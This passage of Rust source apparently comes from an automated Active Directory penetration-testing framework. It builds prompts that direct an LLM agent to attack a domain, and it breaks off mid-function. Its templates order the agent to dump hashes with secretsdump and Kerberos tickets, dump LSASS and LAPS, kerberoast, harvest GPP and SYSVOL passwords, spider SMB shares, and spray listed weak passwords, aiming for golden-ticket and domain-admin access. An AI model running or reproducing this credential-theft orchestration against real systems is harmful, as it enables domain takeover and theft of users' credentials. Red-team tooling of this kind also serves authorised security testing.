//! Task prompt generation for LLM agent steps.
//!
//! Ports the prompt building logic from `src/ares/core/worker/prompts.py`.
//! Each task type gets a specific prompt rendered from a Tera template.
//! Variable extraction from JSON payloads happens in Rust; prompt wording
//! and structure lives in `.tera` template files.

pub mod templates;

use std::collections::HashMap;
use std::fmt::Write;

use ares_core::models::{Credential, Hash, Host, Share, VulnerabilityInfo};
use serde_json::Value;
use tera::Context;

use templates::{
    render_template_with_context, TASK_ACL_ANALYSIS, TASK_COERCION, TASK_COMMAND, TASK_CRACK,
    TASK_LATERAL, TASK_PRIVESC_ENUMERATION, TASK_RECON,
};

// ---------------------------------------------------------------------------
// StateSnapshot — cheap, clonable view of operation state
// ---------------------------------------------------------------------------

/// A snapshot of operation state used for prompt generation.
/// Cloned from `SharedState` to avoid holding the RwLock during LLM calls.
#[derive(Debug, Clone, Default)]
pub struct StateSnapshot {
    pub credentials: Vec<Credential>,
    pub hashes: Vec<Hash>,
    pub hosts: Vec<Host>,
    pub shares: Vec<Share>,
    pub domains: Vec<String>,
    pub discovered_vulnerabilities: HashMap<String, VulnerabilityInfo>,
    pub exploited_vulnerabilities: std::collections::HashSet<String>,
    pub domain_controllers: HashMap<String, String>,
    pub netbios_to_fqdn: HashMap<String, String>,
    pub has_domain_admin: bool,
    pub has_golden_ticket: bool,
}

// ---------------------------------------------------------------------------
// State context formatting (stays in Rust — data processing with truncation)
// ---------------------------------------------------------------------------

/// Maximum items to include in state context to avoid overwhelming the LLM.
const MAX_CREDENTIALS: usize = 8;
const MAX_HASHES: usize = 5;
const MAX_DCS: usize = 3;
const MAX_OTHER_HOSTS: usize = 5;
const MAX_VULNERABILITIES: usize = 5;

/// Format operation state as markdown context for the LLM.
///
/// Includes discovered credentials, hashes, hosts, and pending vulnerabilities.
/// Truncates to avoid exceeding context limits. The result is injected into
/// task templates as `{{ state_context }}`.
pub fn format_state_context(
    state: &StateSnapshot,
    task_type: &str,
    _current_target: Option<&str>,
) -> String {
    let mut ctx = String::with_capacity(2048);

    // Domains
    if !state.domains.is_empty() {
        writeln!(ctx, "### Discovered Domains").unwrap();
        for d in &state.domains {
            writeln!(ctx, "- {d}").unwrap();
        }
        writeln!(ctx).unwrap();
    }

    // Credentials (relevant for lateral, credential_access, exploit, coercion)
    let show_creds = matches!(
        task_type,
        "lateral" | "credential_access" | "exploit" | "coercion"
    );
    if show_creds && !state.credentials.is_empty() {
        writeln!(ctx, "### Discovered Credentials").unwrap();
        for cred in state.credentials.iter().take(MAX_CREDENTIALS) {
            let admin_marker = if cred.is_admin { " [ADMIN]" } else { "" };
            let domain_part = if cred.domain.is_empty() {
                String::new()
            } else {
                format!("@{}", cred.domain)
            };
            writeln!(ctx, "- {}{}{}", cred.username, domain_part, admin_marker).unwrap();
        }
        if state.credentials.len() > MAX_CREDENTIALS {
            writeln!(
                ctx,
                "- ... and {} more",
                state.credentials.len() - MAX_CREDENTIALS
            )
            .unwrap();
        }
        writeln!(ctx).unwrap();
    }

    // Cracked hashes
    let cracked: Vec<&Hash> = state
        .hashes
        .iter()
        .filter(|h| h.cracked_password.is_some())
        .collect();
    if !cracked.is_empty() {
        writeln!(ctx, "### Cracked Hashes").unwrap();
        for h in cracked.iter().take(MAX_HASHES) {
            let domain_part = if h.domain.is_empty() {
                String::new()
            } else {
                format!("@{}", h.domain)
            };
            writeln!(ctx, "- {}{} ({})", h.username, domain_part, h.hash_type).unwrap();
        }
        if cracked.len() > MAX_HASHES {
            writeln!(ctx, "- ... and {} more", cracked.len() - MAX_HASHES).unwrap();
        }
        writeln!(ctx).unwrap();
    }

    // Hosts — separate DCs from others
    if !state.hosts.is_empty() {
        let dcs: Vec<&Host> = state.hosts.iter().filter(|h| h.is_dc).collect();
        let others: Vec<&Host> = state.hosts.iter().filter(|h| !h.is_dc).collect();

        if !dcs.is_empty() {
            writeln!(ctx, "### Domain Controllers").unwrap();
            for h in dcs.iter().take(MAX_DCS) {
                let name = if h.hostname.is_empty() {
                    &h.ip
                } else {
                    &h.hostname
                };
                writeln!(ctx, "- {} ({})", name, h.ip).unwrap();
            }
            writeln!(ctx).unwrap();
        }

        if !others.is_empty() {
            writeln!(ctx, "### Other Hosts").unwrap();
            for h in others.iter().take(MAX_OTHER_HOSTS) {
                let name = if h.hostname.is_empty() {
                    &h.ip
                } else {
                    &h.hostname
                };
                let roles = if h.roles.is_empty() {
                    String::new()
                } else {
                    format!(" [{}]", h.roles.join(", "))
                };
                writeln!(ctx, "- {} ({}){}", name, h.ip, roles).unwrap();
            }
            if others.len() > MAX_OTHER_HOSTS {
                writeln!(ctx, "- ... and {} more", others.len() - MAX_OTHER_HOSTS).unwrap();
            }
            writeln!(ctx).unwrap();
        }
    }

    // Pending vulnerabilities (for exploit/privesc tasks)
    if matches!(task_type, "exploit" | "privesc_enumeration") {
        let pending: Vec<&VulnerabilityInfo> = state
            .discovered_vulnerabilities
            .values()
            .filter(|v| !state.exploited_vulnerabilities.contains(&v.vuln_id))
            .collect();

        if !pending.is_empty() {
            writeln!(ctx, "### Pending Vulnerabilities").unwrap();
            for v in pending.iter().take(MAX_VULNERABILITIES) {
                writeln!(ctx, "- {} ({}) on {}", v.vuln_id, v.vuln_type, v.target).unwrap();
            }
            if pending.len() > MAX_VULNERABILITIES {
                writeln!(
                    ctx,
                    "- ... and {} more",
                    pending.len() - MAX_VULNERABILITIES
                )
                .unwrap();
            }
            writeln!(ctx).unwrap();
        }
    }

    ctx
}

// ---------------------------------------------------------------------------
// Helper: extract credential fields from payload into context
// ---------------------------------------------------------------------------

fn insert_credential_context(ctx: &mut Context, payload: &Value) {
    if let Some(cred) = payload.get("credential") {
        let user = cred["username"].as_str().unwrap_or("");
        let cred_domain = cred["domain"].as_str().unwrap_or("");
        if !user.is_empty() {
            ctx.insert("credential_username", user);
            ctx.insert("credential_domain", cred_domain);

            let has_password = cred
                .get("password")
                .and_then(|v| v.as_str())
                .is_some_and(|p| !p.is_empty());
            ctx.insert(
                "auth_type",
                if has_password {
                    "password"
                } else {
                    "hash/ticket"
                },
            );
        }
    }
}

fn insert_state_context(
    ctx: &mut Context,
    state: Option<&StateSnapshot>,
    task_type: &str,
    target: Option<&str>,
) {
    if let Some(s) = state {
        let state_ctx = format_state_context(s, task_type, target);
        if !state_ctx.is_empty() {
            ctx.insert("state_context", &state_ctx);
        }
    }
}

// ---------------------------------------------------------------------------
// Task prompt generation
// ---------------------------------------------------------------------------

/// Generate a task prompt from a task type and JSON payload.
///
/// Returns `None` if the task type is not recognized.
/// Each task type extracts variables from the payload and renders
/// the corresponding `.tera` template.
pub fn generate_task_prompt(
    task_type: &str,
    task_id: &str,
    payload: &Value,
    state: Option<&StateSnapshot>,
) -> Option<String> {
    let result = match task_type {
        "recon" => generate_recon_prompt(task_id, payload, state),
        "crack" => generate_crack_prompt(task_id, payload),
        "credential_access" => generate_credential_access_prompt(task_id, payload, state),
        "lateral_movement" | "lateral" => generate_lateral_prompt(task_id, payload, state),
        "exploit" => generate_exploit_prompt(task_id, payload, state),
        "coercion" => generate_coercion_prompt(task_id, payload, state),
        "privesc_enumeration" => generate_privesc_enumeration_prompt(task_id, payload, state),
        "acl_analysis" => generate_acl_analysis_prompt(task_id, payload, state),
        "command" => generate_command_prompt(task_id, payload),
        _ => return None,
    };
    Some(result.unwrap_or_else(|e| format!("Error generating prompt: {e}")))
}

fn generate_recon_prompt(
    task_id: &str,
    payload: &Value,
    state: Option<&StateSnapshot>,
) -> anyhow::Result<String> {
    let mut ctx = Context::new();
    ctx.insert("task_id", task_id);
    ctx.insert(
        "target_ip",
        payload["target_ip"].as_str().unwrap_or("unknown"),
    );

    let domain = payload["domain"].as_str().unwrap_or("");
    if !domain.is_empty() {
        ctx.insert("domain", domain);
    }

    insert_credential_context(&mut ctx, payload);

    let techniques: Vec<&str> = payload["techniques"]
        .as_array()
        .map(|arr| arr.iter().filter_map(|v| v.as_str()).collect())
        .unwrap_or_default();
    if !techniques.is_empty() {
        ctx.insert("techniques", &techniques);
    }

    insert_state_context(&mut ctx, state, "recon", payload["target_ip"].as_str());

    render_template_with_context(TASK_RECON, &ctx)
}

fn generate_crack_prompt(task_id: &str, payload: &Value) -> anyhow::Result<String> {
    let mut ctx = Context::new();
    ctx.insert("task_id", task_id);
    ctx.insert(
        "hash_type",
        payload["hash_type"].as_str().unwrap_or("unknown"),
    );
    ctx.insert("hash_value", payload["hash_value"].as_str().unwrap_or(""));

    let username = payload["username"].as_str().unwrap_or("");
    if !username.is_empty() {
        ctx.insert("username", username);
    }

    let domain = payload["domain"].as_str().unwrap_or("");
    if !domain.is_empty() {
        ctx.insert("domain", domain);
    }

    render_template_with_context(TASK_CRACK, &ctx)
}

// ---------------------------------------------------------------------------
// Credential-access helpers
// ---------------------------------------------------------------------------

/// Check if a hash value is compatible with pass-the-hash (NTLM LM:NT format).
fn is_pass_the_hash_compatible(hash_value: Option<&str>) -> bool {
    let Some(raw) = hash_value else {
        return false;
    };
    let normalized = raw.trim();
    if normalized.is_empty() || normalized.contains('$') {
        return false;
    }
    let hex32 = |s: &str| -> bool { s.len() == 32 && s.chars().all(|c| c.is_ascii_hexdigit()) };
    if let Some((lm, nt)) = normalized.split_once(':') {
        if normalized.matches(':').count() != 1 {
            return false;
        }
        if !lm.is_empty() && !hex32(lm) {
            return false;
        }
        hex32(nt)
    } else {
        hex32(normalized)
    }
}

/// Extract techniques array from a payload.
fn payload_techniques(payload: &Value) -> Vec<String> {
    payload
        .get("techniques")
        .and_then(|v| v.as_array())
        .map(|arr| {
            arr.iter()
                .filter_map(|v| v.as_str().map(String::from))
                .collect()
        })
        .unwrap_or_default()
}

/// Build the credential parameter string for technique call sites.
fn cred_param_str(payload: &Value, hash_value: Option<&str>) -> String {
    if let Some(pw) = payload.get("password").and_then(|v| v.as_str()) {
        if !pw.is_empty() {
            return format!("password='{pw}'");
        }
    }
    if let Some(h) = hash_value {
        return format!("hashes='{h}'");
    }
    "password='N/A'".to_string()
}

/// Build the credential display string.
fn cred_display_str(payload: &Value, hash_value: Option<&str>) -> String {
    if let Some(pw) = payload.get("password").and_then(|v| v.as_str()) {
        if !pw.is_empty() {
            return pw.to_string();
        }
    }
    if let Some(h) = hash_value {
        return format!("[HASH] {h}");
    }
    "N/A".to_string()
}

fn generate_credential_access_prompt(
    task_id: &str,
    payload: &Value,
    state: Option<&StateSnapshot>,
) -> anyhow::Result<String> {
    let hash_value = payload
        .get("hash_value")
        .and_then(|v| v.as_str())
        .filter(|s| !s.is_empty());
    let hash_is_pth = is_pass_the_hash_compatible(hash_value);

    let mut techniques = payload_techniques(payload);
    // Strip PtH-only techniques when hash isn't NTLM-compatible
    if hash_value.is_some() && !hash_is_pth {
        techniques.retain(|t| {
            let lower = t.to_lowercase();
            lower != "secretsdump" && lower != "lsassy"
        });
    }

    let targets: Vec<&str> = payload
        .get("target_ips")
        .and_then(|v| v.as_array())
        .map(|arr| arr.iter().filter_map(|v| v.as_str()).collect())
        .unwrap_or_default();
    let dc_ip = payload.get("dc_ip").and_then(|v| v.as_str()).unwrap_or("");
    let domain = payload.get("domain").and_then(|v| v.as_str()).unwrap_or("");
    let username = payload
        .get("username")
        .and_then(|v| v.as_str())
        .unwrap_or("");
    let password = payload
        .get("password")
        .and_then(|v| v.as_str())
        .unwrap_or("");
    let reason = payload.get("reason").and_then(|v| v.as_str()).unwrap_or("");

    let ticket_path = payload.get("ticket_path").and_then(|v| v.as_str());
    let no_pass = payload
        .get("no_pass")
        .and_then(|v| v.as_bool())
        .unwrap_or(false);
    let has_password = !password.is_empty();
    let has_hash = hash_value.is_some();
    let has_creds = has_password || (hash_is_pth && has_hash);

    // -----------------------------------------------------------------------
    // Branch 1: Kerberos ticket-based secretsdump (from S4U chain)
    // -----------------------------------------------------------------------
    if ticket_path.is_some() && no_pass && techniques.iter().any(|t| t == "secretsdump") {
        let target = targets.first().copied().unwrap_or("");
        let user = if username.is_empty() {
            "Administrator"
        } else {
            username
        };
        let ticket = ticket_path.unwrap_or("");
        let mut prompt = format!(
            "**KERBEROS TICKET-BASED SECRETSDUMP**\n\n\
             Target: {target}\n\
             Domain: {domain}\n\
             Username: {user}\n\
             Ticket Path: {ticket}\n\
             DC IP: {dc_ip_display}\n\
             Task ID: {task_id}\n\n\
             **CRITICAL: You have a Kerberos ticket from S4U attack!**\n\
             This ticket allows you to impersonate Administrator to the target.\n\n\
             **EXECUTE secretsdump with Kerberos ticket:**\n\
             secretsdump(\n\
                 target='{target}',\n\
                 username='{user}',\n\
                 no_pass=True,\n\
                 ticket_path='{ticket}'",
            dc_ip_display = if dc_ip.is_empty() { "N/A" } else { dc_ip },
        );
        if !dc_ip.is_empty() {
            write!(prompt, ",\n    dc_ip='{dc_ip}'").unwrap();
        }
        prompt.push_str(
            "\n)\n\n\
             **IMPORTANT:**\n\
             - The ticket_path sets KRB5CCNAME for Kerberos auth\n\
             - no_pass=True tells secretsdump to use -k -no-pass\n\
             - This will dump SAM, LSA secrets, and domain hashes if on a DC\n\n\
             If secretsdump succeeds, look for:\n\
             - krbtgt hash -> GOLDEN TICKET capability\n\
             - Administrator hash -> DOMAIN ADMIN ACHIEVED\n\n\
             Report any hashes found in JSON format:\n\
             ```json\n\
             {\"hash\": {\"username\": \"Administrator\", \"hash_value\": \"...\", \
              \"hash_type\": \"NTLM\", \"domain\": \"...\"}}\n\
             ```",
        );
        if let Some(s) = state {
            prompt.push_str(&format_state_context(s, "credential_access", Some(target)));
        }
        return Ok(prompt);
    }

    // Determine low-hanging-fruit flags
    let has_sysvol = techniques
        .iter()
        .any(|t| t == "sysvol_script_search" || t == "gpp_password_finder");
    let has_spray = techniques
        .iter()
        .any(|t| t == "username_as_password" || t == "password_spray");
    let has_low_hanging =
        reason.to_lowercase().contains("low_hanging_fruit") || has_sysvol || has_spray;

    // -----------------------------------------------------------------------
    // Branch 2: Low-hanging fruit WITH credentials
    // -----------------------------------------------------------------------
    if has_low_hanging && has_password {
        let mut prompt = format!(
            "Perform LOW HANGING FRUIT credential harvesting:\n\
             Domain: {domain}\n\
             DC IP: {dc_ip_display}\n\
             Username: {user_display}\n\
             Password: {password}\n\
             Task ID: {task_id}\n\n\
             **EXECUTE IN THIS ORDER:**\n\
             1. gpp_password_finder(target=DC_IP, username=USER, password=PASS, domain=DOMAIN)\n\
             2. sysvol_script_search(target=DC_IP, username=USER, password=PASS, domain=DOMAIN)\n\
             3. ldap_search_descriptions(...) - check for passwords in LDAP descriptions\n\
             4. username_as_password(...) - check for user=password accounts\n\n\
             These are HIGH SUCCESS RATE techniques that find hardcoded credentials.\n\
             Report any credentials found immediately.",
            dc_ip_display = if dc_ip.is_empty() { "N/A" } else { dc_ip },
            user_display = if username.is_empty() { "N/A" } else { username },
        );
        if let Some(s) = state {
            prompt.push_str(&format_state_context(s, "credential_access", Some(dc_ip)));
        }
        return Ok(prompt);
    }

    // -----------------------------------------------------------------------
    // Branch 3: Username-as-password spray (new users)
    // -----------------------------------------------------------------------
    let is_username_spray = techniques.iter().any(|t| t == "username_as_password")
        && reason.to_lowercase().contains("new_users");
    if is_username_spray {
        let mut cred_line = String::new();
        if !username.is_empty() && !password.is_empty() {
            write!(
                cred_line,
                "**Use these credentials for user enumeration:**\n\
                 Username: {username}\n\
                 Password: {password}\n\n"
            )
            .unwrap();
        }
        let mut prompt = format!(
            "Perform USERNAME_AS_PASSWORD spray to find weak credentials:\n\
             Domain: {domain}\n\
             DC IP: {dc_ip_display}\n\
             Task ID: {task_id}\n\n\
             {cred_line}\
             **EXECUTE username_as_password:**\n\
             1. First save users: save_users_to_file(target='{dc_ip}', username='{username}', \
                password='{password}', domain='{domain}')\n\
             2. Then spray: username_as_password(target='{dc_ip}', domain='{domain}', \
                users_file='/tmp/users.txt')\n\n\
             This tests if users have username=password (e.g., testuser:testuser).\n\
             Zero lockout risk, one attempt per user.\n\
             Report any credentials found immediately.",
            dc_ip_display = if dc_ip.is_empty() { "N/A" } else { dc_ip },
        );
        if let Some(s) = state {
            prompt.push_str(&format_state_context(s, "credential_access", Some(dc_ip)));
        }
        return Ok(prompt);
    }

    // -----------------------------------------------------------------------
    // Branch 4: Share spider with GPP
    // -----------------------------------------------------------------------
    let is_share_spider = techniques.iter().any(|t| t == "share_spider");
    if is_share_spider && has_password {
        let target_ip = targets.first().copied().unwrap_or("");
        let share_name = if reason.to_lowercase().contains("auto_share_spider_") {
            reason
                .to_lowercase()
                .split("auto_share_spider_")
                .last()
                .unwrap_or("")
                .to_string()
        } else {
            String::new()
        };
        let share_hint = if share_name.is_empty() {
            "enumerate all readable shares"
        } else {
            &share_name
        };
        let share_param = if share_name.is_empty() {
            "all"
        } else {
            &share_name
        };

        let mut prompt = format!(
            "**SHARE SPIDER TASK - Search SMB shares for credentials**\n\n\
             Target: {target_ip}\n\
             Domain: {domain}\n\
             Username: {username}\n\
             Password: {password}\n\
             Share hint: {share_hint}\n\
             Task ID: {task_id}\n\n\
             **INSTRUCTIONS:**\n\
             1. Use smbclient_spider(target='{target_ip}', share='{share_param}', \
                username='{username}', password='{password}', domain='{domain}')\n\
             2. Look for interesting files containing credentials:\n\
                - *.txt files (passwords, connection strings)\n\
                - *.xml, *.ini, *.config files (configuration with creds)\n\
                - *.ps1, *.bat, *.cmd files (scripts with hardcoded passwords)\n\
             3. If files are found, use smb_download_file to retrieve them\n\
             4. Parse downloaded files for credentials\n\n\
             **COMMON FINDINGS:**\n\
             - Service account passwords in config files\n\
             - Database connection strings with credentials\n\
             - Admin passwords in deployment scripts\n\
             - User credentials in text files (e.g., secret.txt)\n\n\
             Report any credentials found immediately!"
        );
        if let Some(s) = state {
            prompt.push_str(&format_state_context(
                s,
                "credential_access",
                Some(target_ip),
            ));
        }
        return Ok(prompt);
    }

    // -----------------------------------------------------------------------
    // Branch 5: Technique enforcement WITHOUT credentials
    // -----------------------------------------------------------------------
    let no_cred_techniques = !has_password && !has_hash;
    if !techniques.is_empty() && no_cred_techniques {
        let no_cred_map: HashMap<&str, String> = [
            (
                "asrep_roast",
                format!(
                    "asrep_roast(target='{dc_ip}', domain='{domain}') \
                     - find users without Kerberos pre-auth"
                ),
            ),
            (
                "username_as_password",
                format!(
                    "username_as_password(target='{dc_ip}', domain='{domain}') \
                     - test if users have username=password (e.g., testuser:testuser)"
                ),
            ),
            (
                "password_spray",
                format!(
                    "password_spray(target='{dc_ip}', domain='{domain}', \
                     password='Password1') - try common passwords"
                ),
            ),
            (
                "kerberos_user_enum_noauth",
                format!(
                    "kerberos_user_enum_noauth(target='{dc_ip}', domain='{domain}') \
                     - enumerate valid usernames via Kerberos"
                ),
            ),
        ]
        .into_iter()
        .collect();

        let mut instructions = Vec::new();
        for (i, technique) in techniques.iter().enumerate() {
            let idx = i + 1;
            if let Some(desc) = no_cred_map.get(technique.as_str()) {
                instructions.push(format!("{idx}. {desc}"));
            } else {
                instructions.push(format!("{idx}. {technique}(...)"));
            }
        }

        if !instructions.is_empty() {
            let targets_display = if targets.is_empty() {
                "N/A".to_string()
            } else {
                targets.join(", ")
            };
            let mut prompt = format!(
                "**MANDATORY TECHNIQUE EXECUTION (NO CREDENTIALS)**\n\n\
                 Domain: {domain}\n\
                 DC IP: {dc_ip_display}\n\
                 Targets: {targets_display}\n\
                 Task ID: {task_id}\n\n\
                 **CRITICAL: YOU MUST EXECUTE THESE TECHNIQUES IN ORDER:**\n\
                 **DO NOT run smb_sweep or other slow recon first!**\n\
                 **Complete assigned techniques BEFORE doing anything else.**\n\n\
                 {instructions_text}\n\n\
                 **WORKFLOW:**\n\
                 1. Execute EACH technique above in order\n\
                 2. Report ANY credentials/hashes found immediately\n\
                 3. Only after completing ALL assigned techniques, mark task complete\n\n\
                 **DO NOT:**\n\
                 - Run smb_sweep (wastes 5+ minutes, not your job)\n\
                 - Do additional enumeration before completing assigned techniques\n",
                dc_ip_display = if dc_ip.is_empty() { "N/A" } else { dc_ip },
                instructions_text = instructions.join("\n"),
            );
            if let Some(s) = state {
                prompt.push_str(&format_state_context(s, "credential_access", Some(dc_ip)));
            }
            return Ok(prompt);
        }
    }

    // -----------------------------------------------------------------------
    // Branch 6: Low-hanging fruit WITHOUT credentials
    // -----------------------------------------------------------------------
    if has_low_hanging && !has_password && !has_hash {
        let mut prompt = format!(
            "Perform LOW HANGING FRUIT credential discovery (NO CREDENTIALS):\n\
             Domain: {domain}\n\
             DC IP: {dc_ip_display}\n\
             Task ID: {task_id}\n\n\
             **CRITICAL: These techniques work WITHOUT credentials to discover passwords:**\n\
             1. username_as_password(target=DC_IP, domain=DOMAIN) - HIGH SUCCESS RATE\n\
                Tests if users have username=password (e.g., testuser:testuser)\n\
                Zero lockout risk, one attempt per user\n\n\
             2. password_spray - YOU MUST CALL THIS ONCE FOR EACH PASSWORD:\n\
                password_spray(target=DC_IP, domain=DOMAIN, password='Password1')\n\
                password_spray(target=DC_IP, domain=DOMAIN, password='Welcome1')\n\
                password_spray(target=DC_IP, domain=DOMAIN, password='Summer2024')\n\
                password_spray(target=DC_IP, domain=DOMAIN, password='Company123')\n\
                password_spray(target=DC_IP, domain=DOMAIN, password='Passw0rd!')\n\
                **Call spray for EACH password above - common weak passwords**\n\n\
             3. password_policy(target=DC_IP, domain=DOMAIN) - Check lockout before spraying\n\n\
             These are the FIRST techniques to run when you have no credentials.\n\
             Report any credentials found immediately.",
            dc_ip_display = if dc_ip.is_empty() { "N/A" } else { dc_ip },
        );
        if let Some(s) = state {
            prompt.push_str(&format_state_context(s, "credential_access", Some(dc_ip)));
        }
        return Ok(prompt);
    }

    // -----------------------------------------------------------------------
    // Branch 7: Technique enforcement WITH credentials
    // -----------------------------------------------------------------------
    if !techniques.is_empty() && has_creds {
        let cred_param = cred_param_str(payload, hash_value);
        let cred_display = cred_display_str(payload, hash_value);

        let technique_map: HashMap<&str, String> = [
            (
                "sysvol_script_search",
                format!(
                    "sysvol_script_search(target='{dc_ip}', username='{username}', \
                     {cred_param}, domain='{domain}') \
                     - ~2 seconds, finds hardcoded passwords in login scripts"
                ),
            ),
            (
                "gpp_password_finder",
                format!(
                    "gpp_password_finder(target='{dc_ip}', username='{username}', \
                     {cred_param}, domain='{domain}') \
                     - ~2 seconds, finds GPP/cpassword credentials"
                ),
            ),
            (
                "ldap_search_descriptions",
                format!(
                    "ldap_search_descriptions(target='{dc_ip}', username='{username}', \
                     {cred_param}, domain='{domain}') \
                     - finds passwords in LDAP description fields"
                ),
            ),
            (
                "kerberoast",
                format!(
                    "kerberoast(domain='{domain}', username='{username}', \
                     {cred_param}, dc_ip='{dc_ip}') \
                     - service account hashes (uses correct DC for the domain)"
                ),
            ),
            (
                "secretsdump",
                format!(
                    "secretsdump(target='{dc_ip}', username='{username}', \
                     {cred_param}, domain='{domain}') \
                     - dump hashes (requires admin)"
                ),
            ),
            (
                "lsassy",
                format!(
                    "lsassy(target='{dc_ip}', username='{username}', \
                     {cred_param}, domain='{domain}') \
                     - LSASS memory dump"
                ),
            ),
            (
                "laps_dump",
                format!(
                    "laps_dump(target='{dc_ip}', username='{username}', \
                     {cred_param}, domain='{domain}') \
                     - LAPS local admin passwords"
                ),
            ),
        ]
        .into_iter()
        .collect();

        let mut instructions = Vec::new();
        for (i, technique) in techniques.iter().enumerate() {
            let idx = i + 1;
            if let Some(desc) = technique_map.get(technique.as_str()) {
                instructions.push(format!("{idx}. {desc}"));
            } else {
                instructions.push(format!("{idx}. {technique}(...)"));
            }
        }

        if !instructions.is_empty() {
            let targets_display = if targets.is_empty() {
                "N/A".to_string()
            } else {
                targets.join(", ")
            };
            let mut prompt = format!(
                "**MANDATORY TECHNIQUE EXECUTION**\n\n\
                 Domain: {domain}\n\
                 DC IP: {dc_ip_display}\n\
                 Targets: {targets_display}\n\
                 Username: {user_display}\n\
                 Credential: {cred_display}\n\
                 Task ID: {task_id}\n\n\
                 **CRITICAL: YOU MUST EXECUTE THESE TECHNIQUES IN ORDER:**\n\
                 **DO NOT run smb_sweep, kerberos_user_enum, or other recon first!**\n\
                 **These techniques are FAST (~2-5 seconds each) and HIGH VALUE.**\n\n\
                 {instructions_text}\n\n\
                 **WORKFLOW:**\n\
                 1. Execute EACH technique above in order - they are FAST\n\
                 2. Report ANY credentials found immediately\n\
                 3. Only after completing ALL assigned techniques, mark task complete\n\n\
                 **DO NOT:**\n\
                 - Run smb_sweep (wastes 5+ minutes)\n\
                 - Run kerberos_user_enum_noauth (not your job)\n\
                 - Do additional recon before completing assigned techniques\n",
                dc_ip_display = if dc_ip.is_empty() { "N/A" } else { dc_ip },
                user_display = if username.is_empty() { "N/A" } else { username },
                instructions_text = instructions.join("\n"),
            );
            if let Some(s) = state {
                prompt.push_str(&format_state_context(s, "credential_access", Some(dc_ip)));
            }
            return Ok(prompt);
        }
    }

    // -----------------------------------------------------------------------
    // Generic fallback — uses Tera template
    // -----------------------------------------------------------------------
    let cred_type = if has_password {
        "password"
    } else if has_hash {
        if hash_is_pth {
            "hash"
        } else {
            "hash (non-NTLM)"
        }
    } else {
        "none"
    };
    let hash_note = if has_hash && !hash_is_pth {
        "NOTE: Provided hash is not NTLM pass-the-hash compatible; \
         do not attempt secretsdump/lsassy with it.\n"
    } else {
        ""
    };
    let cred_value = if has_password {
        password
    } else {
        hash_value.unwrap_or("N/A")
    };
    let source = payload
        .get("credential_source")
        .and_then(|v| v.as_str())
        .unwrap_or("");
    let hash_type = payload
        .get("hash_type")
        .and_then(|v| v.as_str())
        .unwrap_or("");
    let techniques_display = if techniques.is_empty() {
        "auto-select".to_string()
    } else {
        techniques.join(", ")
    };
    let targets_display = if targets.is_empty() {
        "N/A".to_string()
    } else {
        targets.join(", ")
    };

    let mut prompt = format!(
        "Perform credential access against the target environment:\n\
         Domain: {domain}\n\
         Targets: {targets_display}\n\
         DC IP: {dc_ip_display}\n\
         Username: {user_display}\n\
         Credential ({cred_type}): {cred_value}\n",
        dc_ip_display = if dc_ip.is_empty() { "N/A" } else { dc_ip },
        user_display = if username.is_empty() { "N/A" } else { username },
    );
    if !hash_type.is_empty() {
        writeln!(prompt, "Hash Type: {hash_type}").unwrap();
    }
    if !source.is_empty() {
        writeln!(prompt, "Credential Source: {source}").unwrap();
    }
    if !reason.is_empty() {
        writeln!(prompt, "Reason: {reason}").unwrap();
    }
    writeln!(prompt, "Techniques: {techniques_display}").unwrap();
    writeln!(prompt, "Task ID: {task_id}\n").unwrap();
    if !hash_note.is_empty() {
        writeln!(prompt, "{hash_note}").unwrap();
    }
    prompt.push_str(
        "Use the exact credential value above; do not substitute placeholders. \
         If DC IP is provided, pass -dc-ip to Kerberos/LDAP tools to avoid DNS issues. \
         **PRIORITY ORDER when creds available:**\n\
         1. gpp_password_finder + sysvol_script_search (LOW HANGING FRUIT - run first!)\n\
         2. Kerberoast for service account hashes\n\
         3. secretsdump if admin access exists\n\
         4. LSASS dumping if viable\n\
         Report any hashes or credentials found.",
    );
    if let Some(s) = state {
        prompt.push_str(&format_state_context(s, "credential_access", Some(dc_ip)));
    }
    Ok(prompt)
}

fn generate_lateral_prompt(
    task_id: &str,
    payload: &Value,
    state: Option<&StateSnapshot>,
) -> anyhow::Result<String> {
    let mut ctx = Context::new();
    ctx.insert("task_id", task_id);
    ctx.insert(
        "technique",
        payload["technique"].as_str().unwrap_or("psexec"),
    );
    ctx.insert(
        "target_ip",
        payload["target_ip"].as_str().unwrap_or("unknown"),
    );

    insert_credential_context(&mut ctx, payload);
    insert_state_context(&mut ctx, state, "lateral", payload["target_ip"].as_str());

    render_template_with_context(TASK_LATERAL, &ctx)
}

fn generate_exploit_prompt(
    task_id: &str,
    payload: &Value,
    state: Option<&StateSnapshot>,
) -> anyhow::Result<String> {
    let vuln_type = payload
        .get("vuln_type")
        .and_then(|v| v.as_str())
        .unwrap_or("");
    let target = payload.get("target").and_then(|v| v.as_str()).unwrap_or("");
    let domain = payload.get("domain").and_then(|v| v.as_str()).unwrap_or("");

    let base_prompt = format!(
        "Exploit vulnerability:\n\
         Type: {vuln_type}\n\
         Target: {target}\n\
         Vuln ID: {vuln_id}\n\
         Params: {params}\n\
         Task ID: {task_id}\n\n",
        vuln_id = payload
            .get("vuln_id")
            .and_then(|v| v.as_str())
            .unwrap_or("unknown"),
        params = serde_json::to_string(payload).unwrap_or_default(),
    );

    // -------------------------------------------------------------------
    // ADCS enumeration
    // -------------------------------------------------------------------
    if vuln_type == "adcs_enumerate" {
        let dc_ip = payload
            .get("dc_ip")
            .and_then(|v| v.as_str())
            .unwrap_or(target);
        let username = payload
            .get("username")
            .and_then(|v| v.as_str())
            .unwrap_or("");
        let password = payload
            .get("password")
            .and_then(|v| v.as_str())
            .unwrap_or("");

        let mut prompt = format!(
            "**ADCS ENUMERATION TASK**\n\n\
             Target CA Server: {target}\n\
             Domain: {domain}\n\
             DC IP: {dc_ip}\n\
             Credentials: {domain}\\{username}\n\
             Task ID: {task_id}\n\n\
             **STEP BUDGET: ~20 steps max. Work efficiently!**\n\n\
             **HARD LIMITS:**\n\
             - 'connection refused'/'timed out' -> CA unreachable, STOP immediately\n\
             - 'web enrollment' error -> ESC8 not viable, skip it\n\
             - Max 2 attempts at certipy_find, then report failure\n\n\
             **INSTRUCTIONS:**\n\
             1. Run certipy_find to enumerate ADCS vulnerabilities:\n\
                certipy_find(domain='{domain}', username='{username}', \
                password='{password}', dc_ip='{dc_ip}')\n\n\
             2. Look for ESC1-ESC15 vulnerabilities in the output\n\
             3. Report any vulnerable templates found\n\
             4. If ESC1/ESC4 found: can request cert with arbitrary UPN\n\
             5. If ESC8 found: web enrollment relay attack possible\n\n\
             **ON FAILURE**: Call task_complete immediately with failure reason.\n\
             Do NOT keep retrying if CA/web enrollment is unreachable."
        );
        if let Some(s) = state {
